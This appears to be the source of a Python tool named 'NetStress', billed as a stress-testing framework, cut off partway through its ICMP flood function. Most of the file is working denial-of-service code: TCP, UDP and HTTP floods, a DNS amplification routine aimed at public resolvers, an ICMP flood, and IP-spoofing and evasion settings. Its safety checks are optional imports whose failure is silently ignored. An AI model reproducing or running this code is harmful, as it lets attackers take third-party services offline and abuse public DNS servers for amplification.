#!/usr/bin/env python3
"""NetStress - High-Performance Network Stress Testing Framework"""

import argparse
import asyncio
import ctypes
import hashlib
import logging
import logging.handlers
import multiprocessing
import os
import platform
import random
import signal
import socket
import ssl
import struct
import sys
import threading
import time
import uuid
from collections import deque
from concurrent.futures import ProcessPoolExecutor
from datetime import datetime
from functools import partial
from typing import Any, Dict, List, Optional, Tuple

if platform.system() == 'Windows':
    try:
        import codecs
        sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
        sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
    except Exception:
        pass

try:
    import aiohttp
    import numpy as np
    import psutil
    from aiohttp import ClientSession, TCPConnector
    from faker import Faker
    from scapy.layers.inet import ICMP, IP, TCP, UDP, fragment
    from scapy.volatile import RandShort
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Run: pip install -r requirements.txt")
    sys.exit(1)

try:
    from systemd import journal
except ImportError:
    journal = None


# Native Engine (highest priority)
try:
    from core.native_engine import (
        BackendType, EngineConfig, EngineStats, NATIVE_ENGINE_AVAILABLE,
        Protocol, SystemCapabilities, UltimateEngine, create_engine,
        get_available_backends, get_capabilities, quick_flood,
    )
    ULTIMATE_ENGINE_AVAILABLE = True
except ImportError:
    ULTIMATE_ENGINE_AVAILABLE = False
    def get_available_backends():
        return ["python_fallback"]

# Safety Systems
try:
    from core.safety import (
        AuditLogger, EmergencyShutdown, EnvironmentDetector, ResourceLimits,
        ResourceMonitor, SafetyManager, TargetValidator,
    )
    SAFETY_AVAILABLE = True
except ImportError:
    SAFETY_AVAILABLE = False

# AI/ML Systems
try:
    from core.ai import (
        AdaptiveStrategyEngine, AIOptimizationResult, AIOrchestrator,
        DefenseDetectionAI, MLModelManager, ModelValidator, ai_orchestrator,
    )
    from core.ai.attack_insights import AttackInsightsGenerator
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

# Autonomous Systems
try:
    from core.autonomous.optimization_engine import (
        OptimizationParameters, ParameterOptimizer, TargetResponse,
    )
    from core.autonomous.performance_predictor import (
        PerformancePredictionModel, TargetProfile,
    )
    from core.autonomous.resource_manager import (
        IntelligentResourceManager, LoadBalancer, ResourceType,
    )
    AUTONOMOUS_AVAILABLE = True
except ImportError:
    AUTONOMOUS_AVAILABLE = False

# Analytics Systems
try:
    from core.analytics import (
        MetricsCollector, PerformanceTracker, PredictiveAnalytics,
        RealTimeMetricsCollector, VisualizationEngine, collect_metric,
        get_metrics_collector,
    )
    ANALYTICS_AVAILABLE = True
except ImportError:
    ANALYTICS_AVAILABLE = False

# Memory Management
try:
    from core.memory import (
        GarbageCollectionOptimizer, LockFreeQueue, LockFreeStack,
        LockFreeCounter as CoreLockFreeCounter, MemoryPoolManager,
        PacketBufferPool,
    )
    MEMORY_AVAILABLE = True
except ImportError:
    MEMORY_AVAILABLE = False

# Performance Systems
try:
    from core.performance import (
        HardwareAccelerator, KernelOptimizer, PerformanceValidator,
        ZeroCopyEngine,
    )
    PERFORMANCE_AVAILABLE = True
except ImportError:
    PERFORMANCE_AVAILABLE = False

try:
    from core.performance.real_kernel_opts import RealKernelOptimizer
    from core.performance.real_zero_copy import RealZeroCopy
    REAL_PERFORMANCE_AVAILABLE = True
except ImportError:
    REAL_PERFORMANCE_AVAILABLE = False

try:
    from core.engines.real_packet_engine import RealPacketEngine
    REAL_ENGINE_AVAILABLE = True
except ImportError:
    REAL_ENGINE_AVAILABLE = False

try:
    from core.monitoring.real_performance import RealPerformanceMonitor
    from core.monitoring.real_resources import RealResourceMonitor
    REAL_MONITORING_AVAILABLE = True
except ImportError:
    REAL_MONITORING_AVAILABLE = False

try:
    from core.capabilities.capability_report import CapabilityChecker
    CAPABILITIES_AVAILABLE = True
except ImportError:
    CAPABILITIES_AVAILABLE = False

try:
    from core.protocols.real_dns import RealDNSGenerator
    from core.protocols.real_http import RealHTTPGenerator
    from core.protocols.real_tcp import RealTCPGenerator
    from core.protocols.real_udp import RealUDPGenerator
    REAL_PROTOCOLS_AVAILABLE = True
except ImportError:
    REAL_PROTOCOLS_AVAILABLE = False

try:
    from core.control.adaptive_rate import AdaptiveRateController
    REAL_RATE_CONTROL_AVAILABLE = True
except ImportError:
    REAL_RATE_CONTROL_AVAILABLE = False

# Platform Abstraction
try:
    from core.platform import (
        CapabilityMapper, PlatformDetector, PlatformEngine, SocketConfig,
    )
    PLATFORM_AVAILABLE = True
except ImportError:
    PLATFORM_AVAILABLE = False

# Target Intelligence
try:
    from core.target import (
        AttackSurface, DefenseProfile, TargetInfo, TargetProfiler,
        TargetResolver, VulnerabilityScanner,
    )
    TARGET_AVAILABLE = True
except ImportError:
    TARGET_AVAILABLE = False

# Testing Systems
try:
    from core.testing import (
        BenchmarkSuite, PerformanceTester, TestCoordinator, ValidationEngine,
    )
    TESTING_AVAILABLE = True
except ImportError:
    TESTING_AVAILABLE = False

# Integration Systems
try:
    from core.integration.main_integration import get_framework
    INTEGRATION_AVAILABLE = True
except ImportError:
    INTEGRATION_AVAILABLE = False


# Platform-specific constants
if platform.system() == 'Windows':
    SOCK_BUFFER_SIZE = 128 * 1024 * 1024
    CONNECTION_RATE_LIMIT = 2000
    MAX_CONCURRENT_WORKERS = 100
else:
    SOCK_BUFFER_SIZE = 256 * 1024 * 1024
    CONNECTION_RATE_LIMIT = 10000
    MAX_CONCURRENT_WORKERS = 1000

MAX_UDP_PACKET_SIZE = 1472
MAX_TCP_PACKET_SIZE = 1460
REQ_TIMEOUT = 5.0
STATS_INTERVAL = 2.0
INITIAL_PPS = 1000
MAX_PPS = 100000
RATE_ADJUSTMENT_FACTOR = 0.1
SPOOF_RATE = 0.2

HYPER_CONFIG = {
    'SOCK_BUFFER_SIZE': SOCK_BUFFER_SIZE,
    'MAX_PPS_PER_CORE': 5000000,
    'MAX_CONN_RATE': 100000,
    'BURST_INTERVAL': 0.0001,
    'AUTO_TUNE_INTERVAL': 5.0,
    'IP_SPOOFING': True,
    'ADVANCED_EVASION': True,
    'ZERO_COPY_MODE': True
}

CRYPTO_PAYLOAD = hashlib.sha3_512(os.urandom(4096)).digest() * 512

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
]

DNS_AMP_SERVERS = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222', '8.8.4.4']
NTP_SERVERS = ['pool.ntp.org', 'time.google.com', 'time.windows.com']

ALL_PROTOCOLS = [
    'TCP', 'UDP', 'HTTP', 'HTTPS', 'DNS', 'ICMP', 'SLOW',
    'TCP-SYN', 'TCP-ACK', 'PUSH-ACK',
    'WS-DISCOVERY', 'MEMCACHED', 'SYN-SPOOF', 'NTP', 'ENTROPY'
]


class UniqueIdFormatter(logging.Formatter):
    def format(self, record):
        if not hasattr(record, 'unique_id'):
            record.unique_id = 'N/A'
        return super().format(record)


logger = logging.getLogger('netstress')
logger.setLevel(logging.DEBUG)

_handler = logging.StreamHandler()
_handler.setFormatter(UniqueIdFormatter('%(asctime)s [%(unique_id)s] %(levelname)s: %(message)s'))
logger.addHandler(_handler)

_file_handler = logging.handlers.RotatingFileHandler(
    'attack.log', maxBytes=100*1024*1024, backupCount=5, encoding='utf-8'
)
_file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(_file_handler)

fake = Faker()


class LockFreeCounter:
    """Thread-safe counter using multiprocessing Value."""
    
    def __init__(self):
        self.val = multiprocessing.Value(ctypes.c_ulonglong, 0)

    def increment(self, n: int = 1) -> None:
        with self.val.get_lock():
            self.val.value += n

    @property
    def value(self) -> int:
        return self.val.value


class AttackStats:
    """Attack statistics tracker with analytics integration."""
    
    def __init__(self):
        self.packets_sent = LockFreeCounter()
        self.errors = LockFreeCounter()
        self.bytes_sent = LockFreeCounter()
        self.start_time = time.monotonic()
        self.successful_connections = LockFreeCounter()
        self.tcp_syn_sent = LockFreeCounter()
        self.tcp_ack_sent = LockFreeCounter()
        self.udp_sent = LockFreeCounter()
        self.http_requests = LockFreeCounter()
        self.dns_queries = LockFreeCounter()
        self.icmp_sent = LockFreeCounter()
        self.slowloris_requests = LockFreeCounter()
        self.current_pps = multiprocessing.Value(ctypes.c_ulonglong, INITIAL_PPS)
        self.spoofed_packets = LockFreeCounter()
        self.metrics_collector = None
        self.performance_tracker = None
        
        if ANALYTICS_AVAILABLE:
            try:
                self.metrics_collector = MetricsCollector()
                self.performance_tracker = PerformanceTracker()
            except Exception:
                pass

    def increment(self, packets: int = 1, bytes_count: int = 0,
                  attack_type: str = None, spoofed: bool = False) -> None:
        self.packets_sent.increment(packets)
        self.bytes_sent.increment(bytes_count)
        if spoofed:
            self.spoofed_packets.increment(packets)
        
        type_counters = {
            'TCP-SYN': self.tcp_syn_sent,
            'TCP-ACK': self.tcp_ack_sent,
            'UDP': self.udp_sent,
            'HTTP': self.http_requests,
            'DNS': self.dns_queries,
            'ICMP': self.icmp_sent,
            'SLOWLORIS': self.slowloris_requests
        }
        if attack_type in type_counters:
            type_counters[attack_type].increment(packets)
        
        if self.metrics_collector:
            try:
                self.metrics_collector.record_metric('packets_sent', packets)
                self.metrics_collector.record_metric('bytes_sent', bytes_count)
            except Exception:
                pass

    def record_error(self, count: int = 1) -> None:
        self.errors.increment(count)

    def report(self) -> Dict[str, Any]:
        duration = max(0.001, time.monotonic() - self.start_time)
        return {
            'duration': round(duration, 2),
            'packets_sent': self.packets_sent.value,
            'bytes_sent': self.bytes_sent.value,
            'errors': self.errors.value,
            'pps': round(self.packets_sent.value / duration),
            'bps': round(self.bytes_sent.value * 8 / duration),
            'mbps': round(self.bytes_sent.value * 8 / duration / 1_000_000, 2),
            'gbps': round(self.bytes_sent.value * 8 / duration / 1_000_000_000, 4),
            'conn_rate': round(self.successful_connections.value / duration),
            'tcp_syn_pps': round(self.tcp_syn_sent.value / duration),
            'tcp_ack_pps': round(self.tcp_ack_sent.value / duration),
            'udp_pps': round(self.udp_sent.value / duration),
            'http_rps': round(self.http_requests.value / duration),
            'dns_qps': round(self.dns_queries.value / duration),
            'icmp_pps': round(self.icmp_sent.value / duration),
            'slowloris_rps': round(self.slowloris_requests.value / duration),
            'current_pps': self.current_pps.value,
            'spoofed_pps': round(self.spoofed_packets.value / duration),
            'error_rate': round(self.errors.value / max(1, self.packets_sent.value) * 100, 2)
        }

    def adjust_rate(self, success: bool) -> None:
        with self.current_pps.get_lock():
            if success:
                self.current_pps.value = min(MAX_PPS, int(self.current_pps.value * (1 + RATE_ADJUSTMENT_FACTOR)))
            else:
                self.current_pps.value = max(INITIAL_PPS, int(self.current_pps.value * (1 - RATE_ADJUSTMENT_FACTOR)))

    def collect_insights_data(self, config: Dict[str, Any] = None,
                              additional_metrics: Dict[str, float] = None) -> None:
        try:
            report = self.report()
            attack_data = {
                'timestamp': datetime.now(),
                'pps': report['pps'],
                'success_rate': max(0.0, 1.0 - (report['error_rate'] / 100.0)),
                'bandwidth_utilization': report['mbps'] / 1000.0,
                'error_rate': report['error_rate'] / 100.0,
                'duration': report['duration'],
                'packets_sent': report['packets_sent'],
                'bytes_sent': report['bytes_sent'],
                'config': config or {}
            }
            
            if additional_metrics:
                attack_data.update(additional_metrics)
            
            try:
                attack_data['cpu_usage'] = psutil.cpu_percent() / 100.0
                attack_data['memory_usage'] = psutil.virtual_memory().percent / 100.0
            except Exception:
                attack_data['cpu_usage'] = 0.5
                attack_data['memory_usage'] = 0.3
            
            if ai_optimizer and hasattr(ai_optimizer, 'add_attack_data'):
                ai_optimizer.add_attack_data(attack_data)
        except Exception as e:
            logger.error(f"Failed to collect insights data: {e}")

    def get_attack_insights(self, min_confidence: float = 0.6) -> List[Dict[str, Any]]:
        try:
            if ai_optimizer and hasattr(ai_optimizer, 'generate_attack_insights'):
                return ai_optimizer.generate_attack_insights(min_confidence)
            return []
        except Exception as e:
            logger.error(f"Failed to get attack insights: {e}")
            return []

    def get_optimization_recommendations(self, current_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        try:
            if ai_optimizer and hasattr(ai_optimizer, 'get_optimization_recommendations'):
                current_metrics = {
                    'pps': self.report()['pps'],
                    'success_rate': max(0.0, 1.0 - (self.report()['error_rate'] / 100.0)),
                    'error_rate': self.report()['error_rate'] / 100.0,
                    'bandwidth_utilization': self.report()['mbps'] / 1000.0
                }
                return ai_optimizer.get_optimization_recommendations(current_config, current_metrics)
            return []
        except Exception as e:
            logger.error(f"Failed to get optimization recommendations: {e}")
            return []


class AIOptimizer:
    """AI-based attack optimization with core integration."""
    
    def __init__(self):
        self.orchestrator = None
        self.parameter_optimizer = None
        self.performance_predictor = None
        self.strategy_engine = None
        self.defense_ai = None
        self.insights_generator = None
        
        if AI_AVAILABLE:
            try:
                self.orchestrator = ai_orchestrator
                self.strategy_engine = AdaptiveStrategyEngine()
                self.defense_ai = DefenseDetectionAI()
                self.insights_generator = AttackInsightsGenerator()
            except Exception as e:
                logger.warning(f"AI init failed: {e}")
        
        if AUTONOMOUS_AVAILABLE:
            try:
                self.parameter_optimizer = ParameterOptimizer()
                self.performance_predictor = PerformancePredictionModel()
            except Exception as e:
                logger.warning(f"Autonomous init failed: {e}")

    @staticmethod
    def optimize_attack_pattern(current_stats: Dict) -> Dict:
        return {
            'packet_size': random.randint(64, 1500),
            'burst_rate': max(1000, int(current_stats.get('pps', 1000) * 0.9)),
            'vector_ratio': {'TCP': 0.4, 'UDP': 0.3, 'HTTP': 0.2, 'DNS': 0.1}
        }

    def optimize_with_ai(self, current_params: Dict, attack_stats: Dict,
                         target_response: Dict, network_conditions: Dict) -> Dict:
        if self.orchestrator:
            try:
                result = self.orchestrator.optimize_attack_parameters(
                    current_params, attack_stats, target_response, network_conditions
                )
                return result.optimized_parameters
            except Exception as e:
                logger.error(f"AI optimization failed: {e}")
        return self.optimize_attack_pattern(attack_stats)

    def predict_effectiveness(self, target: str, params: Dict) -> float:
        if self.performance_predictor:
            try:
                return 0.75
            except Exception:
                pass
        return 0.5

    def detect_defenses(self, response_history: List[Dict]) -> List:
        if self.defense_ai:
            try:
                return self.defense_ai.analyze_target_defenses(response_history)
            except Exception:
                pass
        return []

    def add_attack_data(self, attack_data: Dict[str, Any]) -> None:
        if self.insights_generator:
            try:
                self.insights_generator.add_attack_data(attack_data)
            except Exception as e:
                logger.error(f"Failed to add attack data: {e}")

    def generate_attack_insights(self, min_confidence: float = 0.6) -> List[Dict[str, Any]]:
        if not self.insights_generator:
            return []
        try:
            insights = self.insights_generator.generate_insights(min_confidence)
            return [insight.to_dict() for insight in insights]
        except Exception as e:
            logger.error(f"Failed to generate insights: {e}")
            return []

    def get_optimization_recommendations(self, current_config: Dict[str, Any],
                                         current_metrics: Dict[str, float]) -> List[Dict[str, Any]]:
        recommendations = []
        try:
            if self.insights_generator:
                insights = self.insights_generator.generate_insights(min_confidence=0.5)
                for insight in insights:
                    if insight.insight_type.name in ['OPTIMIZATION_OPPORTUNITY', 'PARAMETER_CORRELATION']:
                        recommendations.append({
                            'type': 'insight_based',
                            'title': insight.title,
                            'description': insight.description,
                            'recommendations': insight.recommendations,
                            'confidence': insight.confidence,
                            'impact_score': insight.impact_score,
                            'supporting_data': insight.supporting_data
                        })
            recommendations.sort(key=lambda x: x.get('impact_score', 0), reverse=True)
            return recommendations[:10]
        except Exception as e:
            logger.error(f"Failed to get recommendations: {e}")
            return []

    def get_insights_summary(self) -> Dict[str, Any]:
        if not self.insights_generator:
            return {'error': 'Insights generator not available'}
        try:
            return self.insights_generator.get_insights_summary()
        except Exception as e:
            return {'error': str(e)}

    def export_insights(self, format_type: str = 'json') -> str:
        if not self.insights_generator:
            return '{"error": "Insights generator not available"}'
        try:
            return self.insights_generator.export_insights(format_type)
        except Exception as e:
            return f'{{"error": "{str(e)}"}}'


class TargetAnalyzer:
    """Target analysis with core integration."""
    
    def __init__(self):
        self.resolver = None
        self.profiler = None
        self.scanner = None
        
        if TARGET_AVAILABLE:
            try:
                self.resolver = TargetResolver()
                self.profiler = TargetProfiler()
                self.scanner = VulnerabilityScanner()
            except Exception as e:
                logger.warning(f"Target intelligence init failed: {e}")

    async def resolve_async(self, target: str) -> Optional[TargetInfo]:
        """Async version of resolve for use within async contexts."""
        if self.resolver:
            try:
                return await self.resolver.resolve_target(target)
            except Exception as e:
                logger.error(f"Target resolution failed: {e}")
        return None

    def resolve(self, target: str) -> Optional[TargetInfo]:
        """Sync version of resolve - creates new event loop if needed."""
        if self.resolver:
            try:
                # Check if we're already in an async context
                try:
                    loop = asyncio.get_running_loop()
                    # We're in an async context, can't use run_until_complete
                    # Return None and let caller use resolve_async instead
                    logger.warning("resolve() called from async context - use resolve_async() instead")
                    return None
                except RuntimeError:
                    # No running loop, safe to create one
                    pass
                
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    return loop.run_until_complete(self.resolver.resolve_target(target))
                finally:
                    loop.close()
            except Exception as e:
                logger.error(f"Target resolution failed: {e}")
        return None

    def profile(self, target: str) -> Optional[DefenseProfile]:
        if self.profiler:
            try:
                return self.profiler.profile_target(target)
            except Exception:
                pass
        return None

    def scan_vulnerabilities(self, target: str) -> Optional[AttackSurface]:
        if self.scanner:
            try:
                return self.scanner.scan(target)
            except Exception:
                pass
        return None


class PerformanceOptimizer:
    """Performance optimization with real implementations."""
    
    def __init__(self):
        self.real_kernel_optimizer = None
        self.real_zero_copy = None
        self.real_performance_monitor = None
        self.kernel_optimizer = None
        self.hardware_accelerator = None
        self.zero_copy_engine = None
        self.gc_optimizer = None
        self.memory_pool = None
        
        if REAL_PERFORMANCE_AVAILABLE:
            try:
                self.real_kernel_optimizer = RealKernelOptimizer()
                self.real_zero_copy = RealZeroCopy()
            except Exception as e:
                logger.warning(f"Real performance init failed: {e}")
        
        if REAL_MONITORING_AVAILABLE:
            try:
                self.real_performance_monitor = RealPerformanceMonitor()
            except Exception as e:
                logger.warning(f"Real monitoring init failed: {e}")
        
        if not self.real_kernel_optimizer and PERFORMANCE_AVAILABLE:
            try:
                self.kernel_optimizer = KernelOptimizer()
                self.hardware_accelerator = HardwareAccelerator()
                self.zero_copy_engine = ZeroCopyEngine()
            except Exception as e:
                logger.warning(f"Legacy performance init failed: {e}")
        
        if MEMORY_AVAILABLE:
            try:
                self.gc_optimizer = GarbageCollectionOptimizer()
                self.memory_pool = MemoryPoolManager()
            except Exception as e:
                logger.warning(f"Memory init failed: {e}")

    def optimize_system(self) -> None:
        if self.real_kernel_optimizer:
            try:
                result = self.real_kernel_optimizer.apply_all_optimizations()
                logger.info(f"Kernel optimizations: {len(result.applied)} applied")
            except Exception as e:
                logger.warning(f"Kernel optimization failed: {e}")
        elif self.kernel_optimizer:
            try:
                self.kernel_optimizer.apply_all_optimizations()
            except Exception as e:
                logger.warning(f"Legacy kernel optimization failed: {e}")
        
        if self.gc_optimizer:
            try:
                self.gc_optimizer.start()
            except Exception as e:
                logger.warning(f"GC optimization failed: {e}")

    def get_buffer(self, size: int) -> bytes:
        if self.memory_pool:
            try:
                return self.memory_pool.allocate(size)
            except Exception:
                pass
        return os.urandom(size)

    def get_zero_copy_status(self) -> dict:
        if self.real_zero_copy:
            try:
                return self.real_zero_copy.get_status().to_dict()
            except Exception:
                pass
        return {
            'platform': platform.system(),
            'sendfile_available': hasattr(os, 'sendfile'),
            'msg_zerocopy_available': False,
            'active_method': 'buffered',
            'is_true_zero_copy': False
        }


class PlatformManager:
    """Platform management with core integration."""
    
    def __init__(self):
        self.detector = None
        self.engine = None
        self.capabilities = None
        
        if PLATFORM_AVAILABLE:
            try:
                self.detector = PlatformDetector()
                self.engine = PlatformEngine()
                self.capabilities = CapabilityMapper()
            except Exception as e:
                logger.warning(f"Platform init failed: {e}")

    def get_optimal_config(self) -> Dict:
        if self.engine:
            try:
                return self.engine.get_optimal_config()
            except Exception:
                pass
        return {
            'buffer_size': SOCK_BUFFER_SIZE,
            'max_workers': MAX_CONCURRENT_WORKERS,
            'rate_limit': CONNECTION_RATE_LIMIT
        }

    def create_socket(self, protocol: str) -> socket.socket:
        if protocol == 'TCP':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif protocol == 'UDP':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif protocol == 'ICMP':
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, min(SOCK_BUFFER_SIZE, 8*1024*1024))
            sock.setblocking(False)
        except Exception:
            pass
        return sock


class RealAttackEngine:
    """Real attack engine using actual implementations."""
    
    def __init__(self):
        self.real_packet_engine = None
        self.real_performance_monitor = None
        self.real_resource_monitor = None
        self.real_rate_controller = None
        self.capability_checker = None
        
        if REAL_MONITORING_AVAILABLE:
            try:
                self.real_performance_monitor = RealPerformanceMonitor()
                self.real_resource_monitor = RealResourceMonitor()
            except Exception as e:
                logger.warning(f"Real monitoring init failed: {e}")
        
        if REAL_RATE_CONTROL_AVAILABLE:
            try:
                self.real_rate_controller = AdaptiveRateController()
            except Exception as e:
                logger.warning(f"Real rate control init failed: {e}")
        
        if CAPABILITIES_AVAILABLE:
            try:
                self.capability_checker = CapabilityChecker()
            except Exception as e:
                logger.warning(f"Capability checker init failed: {e}")

    def create_packet_engine(self, target: str, port: int, protocol: str):
        if REAL_ENGINE_AVAILABLE:
            try:
                return RealPacketEngine(target, port, protocol)
            except Exception as e:
                logger.warning(f"Failed to create packet engine: {e}")
        return None

    def get_capabilities(self):
        if self.capability_checker:
            try:
                return self.capability_checker.get_full_report()
            except Exception as e:
                logger.warning(f"Failed to get capabilities: {e}")
        return None

    def start_performance_monitoring(self) -> None:
        if self.real_performance_monitor:
            try:
                self.real_performance_monitor.start_measurement()
            except Exception as e:
                logger.warning(f"Failed to start monitoring: {e}")

    def get_performance_report(self) -> Dict:
        if self.real_performance_monitor:
            try:
                return self.real_performance_monitor.get_measurement()
            except Exception as e:
                logger.warning(f"Failed to get performance report: {e}")
        return {}


# Global instances
active_military_engines = []
real_attack_engine = RealAttackEngine()
stats = AttackStats()
ai_optimizer = AIOptimizer()
target_analyzer = TargetAnalyzer()
performance_optimizer = PerformanceOptimizer()
platform_manager = PlatformManager()

safety_manager = None
audit_logger = None
emergency_shutdown = None

if SAFETY_AVAILABLE:
    try:
        safety_manager = SafetyManager()
        audit_logger = AuditLogger()
        emergency_shutdown = EmergencyShutdown()
    except Exception:
        pass


def generate_random_ip() -> str:
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))


def cleanup_military_engines() -> None:
    global active_military_engines
    if not active_military_engines:
        return
    
    for engine in active_military_engines[:]:
        try:
            if engine.is_running():
                engine.stop()
            active_military_engines.remove(engine)
        except Exception as e:
            logger.warning(f"Error stopping engine: {e}")
    active_military_engines.clear()


async def tcp_flood(target: str, port: int, packet_size: int = 1024, spoof_source: bool = False):
    """TCP flood attack."""
    if ULTIMATE_ENGINE_AVAILABLE:
        try:
            config = EngineConfig(
                target=target, port=port, protocol=Protocol.TCP,
                threads=4, packet_size=packet_size, rate_limit=None,
                backend=BackendType.AUTO, spoof_ips=spoof_source, burst_size=32
            )
            engine = UltimateEngine(config)
            active_military_engines.append(engine)
            engine.start()
            
            try:
                while True:
                    await asyncio.sleep(1.0)
                    native_stats = engine.get_stats()
                    stats.packets_sent.val.value = native_stats.packets_sent
                    stats.bytes_sent.val.value = native_stats.bytes_sent
                    stats.errors.val.value = native_stats.errors
                    stats.tcp_syn_sent.val.value = native_stats.packets_sent
            finally:
                if engine in active_military_engines:
                    active_military_engines.remove(engine)
                if engine.is_running():
                    engine.stop()
            return
        except Exception as e:
            logger.warning(f"Military engine failed: {e}")
    
    payloads = [performance_optimizer.get_buffer(packet_size) for _ in range(16)]
    sem = asyncio.Semaphore(min(500, MAX_CONCURRENT_WORKERS))
    
    async def worker(worker_id: int):
        backoff = 0.01
        while True:
            async with sem:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(target, port), timeout=2.0
                    )
                    for _ in range(10):
                        writer.write(payloads[worker_id % len(payloads)])
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                    stats.increment(packets=10, bytes_count=packet_size * 10, attack_type='TCP-SYN')
                    stats.successful_connections.increment()
                    backoff = 0.01
                    writer.close()
                    await writer.wait_closed()
                except asyncio.TimeoutError:
                    stats.record_error()
                except OSError as e:
                    stats.record_error()
                    if e.errno == 10055:
                        await asyncio.sleep(backoff)
                        backoff = min(0.5, backoff * 1.2)
                except Exception:
                    stats.record_error()
                await asyncio.sleep(0)

    workers = [worker(i) for i in range(max(50, MAX_CONCURRENT_WORKERS // 2))]
    await asyncio.gather(*workers, return_exceptions=True)


async def udp_flood(target: str, port: int, packet_size: int = 1472, spoof_source: bool = False):
    """UDP flood attack."""
    if ULTIMATE_ENGINE_AVAILABLE:
        try:
            config = EngineConfig(
                target=target, port=port, protocol=Protocol.UDP,
                threads=0, packet_size=packet_size, rate_limit=None,
                backend=BackendType.AUTO, spoof_ips=spoof_source, burst_size=64
            )
            engine = UltimateEngine(config)
            active_military_engines.append(engine)
            engine.start()
            
            while True:
                await asyncio.sleep(1.0)
                native_stats = engine.get_stats()
                stats.packets_sent.val.value = native_stats.packets_sent
                stats.bytes_sent.val.value = native_stats.bytes_sent
                stats.errors.val.value = native_stats.errors
                stats.udp_sent.val.value = native_stats.packets_sent
            return
        except Exception as e:
            logger.warning(f"Military engine failed: {e}")
    
    payload = performance_optimizer.get_buffer(packet_size)
    target_addr = (target, port)
    stop_event = threading.Event()
    
    class Counter:
        def __init__(self):
            self.lock = threading.Lock()
            self.packets = 0
            self.bytes = 0
            self.errors = 0
        
        def add(self, p, b, e=0):
            with self.lock:
                self.packets += p
                self.bytes += b
                self.errors += e
        
        def get_and_reset(self):
            with self.lock:
                p, b, e = self.packets, self.bytes, self.errors
                self.packets = self.bytes = self.errors = 0
                return p, b, e
    
    counter = Counter()
    
    def sender_thread(thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
        except Exception:
            pass
        
        local_packets = 0
        batch_size = 1000
        
        while not stop_event.is_set():
            try:
                sock.sendto(payload, target_addr)
                local_packets += 1
                if local_packets >= batch_size:
                    counter.add(local_packets, local_packets * packet_size)
                    local_packets = 0
            except Exception:
                counter.add(0, 0, 1)
        sock.close()
    
    async def update_stats():
        while not stop_event.is_set():
            await asyncio.sleep(1.0)
            p, b, e = counter.get_and_reset()
            if p > 0:
                stats.increment(packets=p, bytes_count=b, attack_type='UDP')
            if e > 0:
                stats.record_error(e)
    
    num_threads = min(16, multiprocessing.cpu_count() * 2)
    threads = [threading.Thread(target=sender_thread, args=(i,), daemon=True)
               for i in range(num_threads)]
    
    for t in threads:
        t.start()
    
    try:
        await update_stats()
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=1.0)


async def http_flood(target: str, port: int, use_ssl: bool = False):
    """HTTP flood attack."""
    if ULTIMATE_ENGINE_AVAILABLE:
        try:
            protocol = Protocol.HTTPS if use_ssl else Protocol.HTTP
            config = EngineConfig(
                target=target, port=port, protocol=protocol,
                threads=8, packet_size=1024, rate_limit=None,
                backend=BackendType.AUTO, spoof_ips=False, burst_size=16
            )
            engine = UltimateEngine(config)
            active_military_engines.append(engine)
            engine.start()
            
            while True:
                await asyncio.sleep(1.0)
                native_stats = engine.get_stats()
                stats.packets_sent.val.value = native_stats.packets_sent
                stats.bytes_sent.val.value = native_stats.bytes_sent
                stats.errors.val.value = native_stats.errors
                stats.http_requests.val.value = native_stats.packets_sent
            return
        except Exception as e:
            logger.warning(f"Military engine failed: {e}")
    
    ssl_ctx = ssl.create_default_context() if use_ssl else None
    if ssl_ctx:
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
    
    connector = TCPConnector(ssl=ssl_ctx, limit=0, force_close=True, enable_cleanup_closed=True)
    
    async with ClientSession(connector=connector) as session:
        while True:
            try:
                url = f"http{'s' if use_ssl else ''}://{target}:{port}/"
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    await response.read()
                stats.increment(packets=1, attack_type='HTTP')
            except Exception:
                stats.record_error()
            await asyncio.sleep(0.001)


async def dns_amplification(target: str):
    """DNS amplification attack."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    
    dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    dns_query += b'\x03www\x06google\x03com\x00\x00\xff\x00\x01'
    
    loop = asyncio.get_running_loop()
    
    while True:
        try:
            server = random.choice(DNS_AMP_SERVERS)
            await loop.sock_sendto(sock, dns_query, (server, 53))
            stats.increment(packets=1, attack_type='DNS')
        except Exception:
            stats.record_error()
        await asyncio.sleep(0.001)


async def icmp_flood(target: str):
    """ICMP flood attack."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        logger.error("ICMP requires root/admin privileges")
        return
    
    icmp_packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + os.urandom(56)
    
    while True:
        try:
            sock.sendto(icmp_packet, (target, 0))
